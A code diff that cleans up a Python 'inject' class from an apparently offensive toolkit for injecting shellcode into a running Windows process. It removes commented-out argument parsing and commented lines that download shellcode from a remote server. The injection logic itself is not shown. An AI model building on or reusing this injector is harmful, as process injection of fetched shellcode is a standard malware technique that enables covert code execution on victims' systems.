@@ -1,4 +1,3 @@
-#import utils.arg
 import os
 import ctypes
 
@@ -25,9 +24,6 @@ class inject:
     Description = 'Inject shellcode to process'
     Version = '2.0.0'
     delay = 5
-    # Target_Process = ''
-    # Shellcode = ''
-    # StartProcess = False
 
     def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
         self.input_file = input_file
@@ -36,27 +32,6 @@ class inject:
         self.shellcode = shellcode
         self.resume_thread = resume_thread
         self.virtual_protect = virtual_protect
-
-    # def init():
-    #     spName = 'inject'
-    #     spArgList = [
-    #         ['-i', '--input', '', '', 'Input file for process injection'],
-    #         ['-p', '--process', '', '', 'Processname to inject the shellcode'],
-    #         ['-r', '--resume-thread', '', 'store_true', 'Start thread suspended and resume after speciefied time'],
-    #         ['-s', '--start', '', 'store_true', 'If not active, start the process before injection'],
-    #         ['-v', '--virtual-protect', '', 'store_true', 'Deny access on memory for a specified time']
-    #         ]
-    #     utils.arg.CreateSubParser(spName, inject.Description, spArgList)
-
-        # spArgList = [
-        #     # shortflag, flag, choices=, action=, default=, type=, required=, help=
-        #     ['-i', '--input', None, None, None, None, True, 'Input file for process injection'],
-        #     ['-p', '--process', None, None, None, None, True, 'Processname to inject the shellcode'],
-        #     ['-r', '--resume-thread', None, None, None, int, False, 'Start thread suspended and resume after speciefied time'],
-        #     ['-s', '--start', None, 'store_true', None, None, False, 'If not active, start the process before injection'],
-        #     ['-v', '--virtual-protect', None, None, None, int, False, 'Deny access on memory for a specified time']
-        #     ]
-        # utils.arg.CreateSubParserEx(spName, inject.Description, spArgList)
 
     def Start_Process(self):
         tp = self.target_process
@@ -70,12 +45,6 @@ class inject:
         print(f"{nstate.OKGREEN} {self.target_process} process id: {pid}")
         
         return int(pid)
-    
-    # response = request.urlopen(args.server)
-    # shellcode = response.read()
-
-    # if shellcode:
-    #   print(f'[*] retrieved the shellcode from {args.server}')
 
     def start_injection(self):
         if self.Start_Process:
